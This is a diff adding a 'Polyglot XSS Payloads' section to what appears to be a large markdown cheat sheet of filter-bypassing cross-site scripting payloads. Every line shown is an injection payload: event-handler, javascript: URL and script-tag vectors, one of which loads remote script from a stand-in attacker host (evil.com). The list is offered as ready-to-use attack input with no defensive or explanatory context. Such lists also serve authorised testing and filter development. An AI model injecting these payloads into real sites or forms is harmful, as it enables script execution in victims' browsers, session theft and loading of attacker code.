@@ -272,3 +272,20 @@ Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in
 - `<input value=""><img src=x onerror="alert(1)">`
 - `"><svg><script>alert(1)</script></svg>`
 - `<b onmouseover="alert(1)">Hover me</b>`
+
+---
+
+# Polyglot XSS Payloads
+
+### Common Polyglot XSS Payloads
+- `<script src=//evil.com></script>`
+- `">'><script>alert('XSS')</script>`
+- `<img src=x onerror=alert(1)>`
+- `<svg onload=alert(1)>`
+- `<iframe src="javascript:alert(1)"></iframe>`
+- `<body onload=alert(1)>`
+- `<a href="javascript:alert(1)">Click me</a>`
+- `<input value="" onfocus=alert(1)>`
+- `<div onmouseover=alert(1)>Hover me</div>`
+- `<marquee onstart=alert(1)>Scroll me</marquee>`
+
